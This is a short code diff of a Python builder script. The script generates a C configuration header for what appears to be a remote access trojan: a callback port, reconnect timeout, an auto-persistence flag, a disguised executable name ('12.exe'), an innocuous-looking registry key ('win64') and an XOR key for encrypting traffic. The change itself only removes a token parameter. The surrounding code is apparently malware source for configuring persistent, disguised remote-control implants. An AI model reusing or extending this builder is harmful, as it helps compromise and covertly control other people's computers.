@@ -133,7 +133,6 @@ def commonHeader():
 #define PORT 8888 //Port of server
 #define AUTO_PERSISTENCE false
 #define TIMEOUT 3000//Seconds for reconnect to server during a disconnection
-#define TOKEN "|GENERATE_TOKEN|" //the token
 #define NAME_PROG "12.exe" //Name of prog
 #define NAME_KEY_REGISTER  "win64" 
 #define XOR_KEY "123456789" //The key to encrypt and decrypt data using the XOR algorithm
@@ -162,7 +161,7 @@ $USER is changed by the user who executed the program.
 """
     return header
 
-def customHeader(ip, auto, port, reco, name, token, registry, key): 
+def customHeader(ip, auto, port, reco, name, registry, key): 
     #In order not to have an error you need 4 \.
     #Example C:\ = C:\\\\
     header = """
@@ -177,7 +176,6 @@ def customHeader(ip, auto, port, reco, name, token, registry, key):
 #define AUTO_PERSISTENCE {}
 #define TIMEOUT {} // Seconds for reconnect to server during a disconnection
 #define NAME_PROG "{}" //Name of prog
-#define TOKEN "{}"
 #define NAME_KEY_REGISTER  "{}" 
 #define XOR_KEY "{}" //The key to encrypt and decrypt data using the XOR algorithm
 
@@ -200,7 +198,7 @@ def customHeader(ip, auto, port, reco, name, token, registry, key):
 
 #endif
 
-""".format(ip, port, auto, reco, name,token, registry,key)
+""".format(ip, port, auto, reco, name, registry,key)
 
     return header
 
